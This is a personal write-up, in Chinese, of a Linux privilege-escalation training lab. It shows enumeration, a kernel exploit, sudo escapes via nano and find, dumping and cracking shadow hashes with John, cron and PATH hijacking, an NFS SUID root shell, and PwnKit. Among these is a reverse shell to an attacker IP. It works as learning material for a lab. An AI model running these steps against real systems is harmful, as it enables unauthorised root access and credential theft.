## task3

1. `hostname` 命令將返回目標機器的主機名。   
2. `unname -a` 打印系統信息，為我們提供有關係統使用的內核的更多詳細信息。這在搜索可能導致權限提升的任何潛在內核漏洞時非常有用。   

3. `/proc/version`可能會為您提供有關內核版本和其他數據的信息                       
4. `/etc/issue` 該文件通常包含有關操作系統的一些信息，但可以輕鬆定製或更改               
5. `ps`                 
6. `env` 命令將顯示環境變量。            
7. `sudo -l` 命令可用於列出您的用戶可以使用運行的所有命令sudo。              
8. `id` 命令將提供用戶權限級別和組成員身份的一般概述。          
9. /etc/passwd     
10. history 命令可以讓我們對目標系統有所了解，並且雖然很少，但已經存儲了密碼或用戶名等信息     
11. ip route 命令來確認，以查看存在哪些網絡路由。
12. netstat
13. `find`
```
find . -name flag1.txt: 在當前目錄中找到名為“flag1.txt”的文件
find /home -name flag1.txt: 在 /home 目錄中找到文件名“flag1.txt”
find / -type d -name config: 在“/”下找到名為config的目錄
find / -type f -perm 0777：查找具有777權限的文件（所有用戶可讀、可寫和可執行的文件）
find / -perm a=x: 查找可執行文件
find /home -user frank: 在“/home”下查找用戶“frank”的所有文件
find / -mtime 10: 查找最近 10 天內修改過的文件
find / -atime 10: 查找過去 10 天內訪問過的文件
find / -cmin -60: 查找在過去一小時（60 分鐘）內更改的文件
find / -amin -60: 查找最近一小時（60 分鐘）內的文件訪問
find / -size 50M: 查找大小為 50 MB 的文件
```
```
$ hostname
wade7363
$ uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
$ cat /proc/version
Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014
$ cat /etc/issue
Ubuntu 14.04 LTS \n \l

$ python -version
Unknown option: -e
usage: python [option] ... [-c cmd | -m mod | file | -] [arg] ...
Try `python -h' for more information.
$ python --version
Python 2.7.6

```
## task5 權限提升：內核利用
CVE：2015-1328
```
┌──(root💀kali)-[/home/kali/Downloads]
└─# gcc 37292.c -o 37292

┌──(root💀kali)-[/home/kali/Downloads]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.77.114 - - [27/Jan/2022 07:27:36] "GET /37292 HTTP/1.1" 200 -

```


ubuntu
```
cd tmp

wget 

./37292

```

## task6 權限提升：sudo

https://gtfobins.github.io/

用戶“karen”可以在目標系統上以 sudo 權限運行多少程序？
```
$ sudo -l
Matching Defaults entries for karen on ip-10-10-232-36:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-10-232-36:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano

```
提升權限
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

or
```
sudo find . -exec /bin/sh \; -quit
```

## task7 權限提升：SUID

find / -type f -perm -04000 -ls 2>/dev/null將列出設置了 SUID 或 SGID 位的文件。  
-----------------------------------------------------------------------------------
可以使用 unshadow 工具創建一個可以被開膛手約翰破解的文件。為了實現這一點，unshadow 需要/etc/shadow和/etc/passwd文件。    

`unshadow passwd.txt shadow.txt > passwords.txt`    
john --wordlist=/usr/share/wordlists passwords.txt    
-----------------------------------------------------------------------------------
### 另一種選擇是添加一個具有 root 權限的新用戶。這將幫助我們避開繁瑣的密碼破解過程。
可以使用 Kali Linux 上的 openssl 工具快速完成。
`openssl passwd -1 -salt THM password1`    
然後，我們將此密碼和用戶名添加到/etc/passwd 文件中。                        
一旦我們的用戶被添加（請注意如何root:/bin/bash用於提供一個 root                    shell），我們將需要切換到這個用戶並且希望應該有 root 權限。       
 
 shadow => shadow.txt
```
karen@ip-10-10-85-246:/$ base64 /etc/shadow | base64 --decode
root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:18796::::::
ubuntu:!:18796:0:99999:7:::
gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
lxd:!:18796::::::
karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:18796:0:99999:7:::

```

passwd => passwd.txt
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
gerryconway:x:1001:1001::/home/gerryconway:/bin/sh
user2:x:1002:1002::/home/user2:/bin/sh
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
karen:x:1003:1003::/home/karen:/bin/sh

```
`unshadow passwd.txt shadow.txt >pass.txt`

### john
```
┌──(kali㉿kali)-[~/Desktop]
└─$ john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (karen)     
Password1        (user2)     
test123          (gerryconway)     
3g 0:00:00:09 DONE (2022-01-27 08:52) 0.3184g/s 1902p/s 2663c/s 2663C/s paramedic..biscuit1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
### flag3
```
karen@ip-10-10-85-246:/home/ubuntu$ base64 /home/ubuntu/flag3.txt | base64 --decodeTHM-3847834

```
## task8 Capabilities 

系統管理員可以用來提高進程或二進製文件權限級別的另一種方法是“Capabilities(功能)”。功能有助於在更精細的級別上管理權限。例如，如果 SOC 分析師需要使用需要啟動套接字連接的工具，普通用戶將無法做到這一點。如果系統管理員不想給這個用戶更高的權限，他們可以改變二進製文件的能力。結果，二進製文件無需更高權限的用戶即可完成其任務。
功能手冊頁提供了有關其用法和選項的詳細信息。

`可以使用該getcap 工具列出啟用的功能。`

```
Last login: Thu Jan 27 14:12:33 2022 from 10.100.2.203
$ getcap -r / 2>/dev/null

/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep

``` 
## task9 cron
如果有一個以 root 權限運行的計劃任務，我們可以更改將要運行的腳本，那麼我們的腳本將以 root 權限運行。     
```    
任何用戶都可以讀取保存系統範圍 cron 作業的文件，/etc/crontab
```
`cat /etc/crontab`
```
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
```

把backup.sh 的內容改成
```
#!/bin/bash

bash -i >& /dev/tcp/10.9.2.107/8787 0>&1
```
然後他就會彈回root的shell 

matt密碼
```
┌──(kali㉿kali)-[~/Desktop]
└─$ unshadow passwd.txt shadow.txt >pass.txt
                                                                                     
┌──(kali㉿kali)-[~/Desktop]
└─$ john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456           (matt)     
Password1        (karen)     
2g 0:00:00:01 DONE (2022-01-27 10:54) 1.369g/s 2454p/s 2805c/s 2805C/s adriano..fresa
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

## 權限提升：PATH
通常tmp容易寫入，但是不是PATH中 所以` export PATH=/tmp:$PATH`加入
```
karen@ip-10-10-155-52:/$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
karen@ip-10-10-155-52:/$ export PATH=/tmp:$PATH
karen@ip-10-10-155-52:/$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
karen@ip-10-10-155-52:/$ 
```

```
karen@ip-10-10-246-59:/home/murdoch$ ls
test  thm.py
karen@ip-10-10-246-59:/home/murdoch$ ./test 
sh: 1: thm: not found


karen@ip-10-10-246-59:/home/murdoch$ ls -al
total 32
drwxrwxrwx 2 root root  4096 Jan 29 09:39 .
drwxr-xr-x 5 root root  4096 Jun 20  2021 ..
-rwsr-xr-x 1 root root 16712 Jun 20  2021 test
-rw-rw-r-- 1 root root    86 Jun 20  2021 thm.py
```
### root 
可以用這個列出所有可寫的位置
`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`
```
有列出這個
/home/murdoch/
```
可以看見 test 是root root 而且執行的時候會說 thm: not found     
所以`echo "/bin/bash" > thm` 這樣執行test的時候 就會= root執行bash     
可是建完thm後還是說not found ，`export PATH=/home/murdoch:$PATH` 只需要把 thm的路徑加進PATH裡就可以
```
karen@ip-10-10-69-178:/$ cd /home/murdoch/
karen@ip-10-10-69-178:/home/murdoch$ ls -al
total 32
drwxrwxrwx 2 root root  4096 Oct 22 07:19 .
drwxr-xr-x 5 root root  4096 Jun 20  2021 ..
-rwsr-xr-x 1 root root 16712 Jun 20  2021 test
-rw-rw-r-- 1 root root    86 Jun 20  2021 thm.py
karen@ip-10-10-69-178:/home/murdoch$ echo "/bin/bash" > thm
karen@ip-10-10-69-178:/home/murdoch$ chmod 777 thm
karen@ip-10-10-69-178:/home/murdoch$ ./test
sh: 1: thm: not found
karen@ip-10-10-69-178:/home/murdoch$ export PATH=/home/murdoch:$PATH
karen@ip-10-10-69-178:/home/murdoch$ ./test
root@ip-10-10-69-178:/home/murdoch# 
```

##  權限提升：NFS
共享文件夾和遠程管理界面（如 SSH 和 Telnet）也可以幫助您獲得目標系統的 root 訪問權限。某些情況下還需要同時使用這兩個向量，`例如在目標系統上找到根 SSH 私鑰並通過具有根權限的 SSH 連接，而不是嘗試提高當前用戶的權限級別`。         
        
NFS（網絡文件共享）配置保存在 /etc/exports 文件中。此文件是在 NFS 服務器安裝期間創建的，通常可供用戶讀取
```
karen@ip-10-10-114-222:/$ cat /etc/exports 
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)

```
此權限提升向量的關鍵元素是您可以在上面看到的`no_root_squash`選項。


### 1 
枚舉目標機器的可掛載共享
```
┌──(kali㉿kali)-[~]
└─$ showmount -e 10.10.114.222
Export list for 10.10.114.222:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *

```
### 2 
把一個“no_root_squash”共享掛載到我們的攻擊機器上並開始構建我們的可執行文件。
```
┌──(root💀kali)-[/tmp]
└─# mkdir backattack
                                                                                     
┌──(root💀kali)-[/tmp]
└─# mount -o rw 10.10.114.222:/tmp /tmp/backattack 
                                      
```
### 3 
由於我們可以設置 SUID 位，a simple executable that will run /bin/bash on the target system will do the job
`代碼`
```
┌──(root💀kali)-[/tmp/backattack]
└─# cat nfs.c  
int main()
{
        setgid(0);
        setuid(0);
        system("/bin/bash");
        return 0;
}

```

然後編譯他,再設置SUID
```
                                                                                     
┌──(root💀kali)-[/tmp/backattack]
└─# gcc nfs.c -o nfs -w
                                                                                     
┌──(root💀kali)-[/tmp/backattack]
└─# chmod +s nfs             
                                                                                     
┌──(root💀kali)-[/tmp/backattack]
└─# ls -l nfs
-rwsr-sr-x 1 root root 16144 Jan 29 06:48 nfs

```
將在下面看到這兩個文件（nfs.c 和 nfs 存在於目標系統上。我們已經處理了掛載的共享，因此無需傳輸它們）。
```
karen@ip-10-10-114-222:/tmp$ ls
nfs
nfs.c
snap.lxd
systemd-private-938942e0de5c4374b813e2ba8cac71dc-systemd-logind.service-03F8vi
systemd-private-938942e0de5c4374b813e2ba8cac71dc-systemd-resolved.service-H8D11h
systemd-private-938942e0de5c4374b813e2ba8cac71dc-systemd-timesyncd.service-8rV0Hg
karen@ip-10-10-114-222:/tmp$ ./nfs
root@ip-10-10-114-222:/tmp# cd /home

root@ip-10-10-114-222:/home# cd matt/
root@ip-10-10-114-222:/home/matt# ls
flag7.txt
root@ip-10-10-114-222:/home/matt# cat flag7.txt 
THM-89384012
```

## task 12

### 1
`CVE-2021-4034`
```
[leonard@ip-10-10-178-144 ~]$ which python
/usr/bin/python
[leonard@ip-10-10-178-144 ~]$ python trans.py 
sh-4.2# bash -p
Could not open converter from “PWNKIT” to “UTF-8”
bash: /yum: No such file or directory
[root@ip-10-10-178-144 leonard]# cd /
```
### 2 
sudo -l 不可用
```
[leonard@ip-10-10-178-144 ~]$ sudo -l
[sudo] password for leonard: 
Sorry, user leonard may not run sudo on ip-10-10-178-144.
```

### 3 
SUID

```
[leonard@ip-10-10-178-144 ~]$ find / -user root -perm -4000 -print 2>/dev/null
/usr/bin/base64
/usr/bin/ksu
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chage
/usr/bin/newgrp
/usr/bin/staprun
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/Xorg
/usr/bin/mount
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/at
/usr/bin/sudo
```
先用base64 得到shadow和passwd
`passwd`
```
[leonard@ip-10-10-178-144 ~]$ /usr/bin/base64 "/etc/passwd" | base64 --decode
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
colord:x:998:995:User for colord:/var/lib/colord:/sbin/nologin
unbound:x:997:994:Unbound DNS resolver:/etc/unbound:/sbin/nologin
libstoragemgmt:x:996:993:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
saslauth:x:995:76:Saslauthd user:/run/saslauthd:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
gluster:x:994:992:GlusterFS daemons:/run/gluster:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
setroubleshoot:x:993:990::/var/lib/setroubleshoot:/sbin/nologin
rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
radvd:x:75:75:radvd user:/:/sbin/nologin
chrony:x:992:987::/var/lib/chrony:/sbin/nologin
saned:x:991:986:SANE scanner daemon user:/usr/share/sane:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
qemu:x:107:107:qemu user:/:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
sssd:x:990:984:User for sssd:/:/sbin/nologin
usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin
geoclue:x:989:983:User for geoclue:/var/lib/geoclue:/sbin/nologin
gdm:x:42:42::/var/lib/gdm:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
gnome-initial-setup:x:988:982::/run/gnome-initial-setup/:/sbin/nologin
pcp:x:987:981:Performance Co-Pilot:/var/lib/pcp:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
oprofile:x:16:16:Special user account to be used by OProfile:/var/lib/oprofile:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
leonard:x:1000:1000:leonard:/home/leonard:/bin/bash
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
missy:x:1001:1001::/home/missy:/bin/bash
```
`shadow`
```
[leonard@ip-10-10-178-144 ~]$ /usr/bin/base64 "/etc/shadow" | base64 --decode
root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
bin:*:18353:0:99999:7:::
daemon:*:18353:0:99999:7:::
adm:*:18353:0:99999:7:::
lp:*:18353:0:99999:7:::
sync:*:18353:0:99999:7:::
shutdown:*:18353:0:99999:7:::
halt:*:18353:0:99999:7:::
mail:*:18353:0:99999:7:::
operator:*:18353:0:99999:7:::
games:*:18353:0:99999:7:::
ftp:*:18353:0:99999:7:::
nobody:*:18353:0:99999:7:::
pegasus:!!:18785::::::
systemd-network:!!:18785::::::
dbus:!!:18785::::::
polkitd:!!:18785::::::
colord:!!:18785::::::
unbound:!!:18785::::::
libstoragemgmt:!!:18785::::::
saslauth:!!:18785::::::
rpc:!!:18785:0:99999:7:::
gluster:!!:18785::::::
abrt:!!:18785::::::
postfix:!!:18785::::::
setroubleshoot:!!:18785::::::
rtkit:!!:18785::::::
pulse:!!:18785::::::
radvd:!!:18785::::::
chrony:!!:18785::::::
saned:!!:18785::::::
apache:!!:18785::::::
qemu:!!:18785::::::
ntp:!!:18785::::::
tss:!!:18785::::::
sssd:!!:18785::::::
usbmuxd:!!:18785::::::
geoclue:!!:18785::::::
gdm:!!:18785::::::
rpcuser:!!:18785::::::
nfsnobody:!!:18785::::::
gnome-initial-setup:!!:18785::::::
pcp:!!:18785::::::
sshd:!!:18785::::::
avahi:!!:18785::::::
oprofile:!!:18785::::::
tcpdump:!!:18785::::::
leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
mailnull:!!:18785::::::
smmsp:!!:18785::::::
nscd:!!:18785::::::
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
```
破解密碼
```
┌──(root💀kali)-[/home/kali/Desktop]
└─# unshadow passwd.txt shadow.txt >pass.txt

┌──(root💀kali)-[/home/kali/Desktop]
└─# john pass.txt --w=/usr/share/wordlists/rockyou.txt   
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (missy)     

```
切換成missy 之後用sudo -l 可以見到 /usr/bin/find
```
[leonard@ip-10-10-178-144 ~]$ su missy
Password: 
[missy@ip-10-10-178-144 leonard]$ sudo -l
Matching Defaults entries for missy on ip-10-10-178-144:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User missy may run the following commands on ip-10-10-178-144:
    (ALL) NOPASSWD: /usr/bin/find

[missy@ip-10-10-178-144 ~]$ sudo /usr/bin/find . -exec /bin/sh -p \; -quit
sh-4.2# 

```
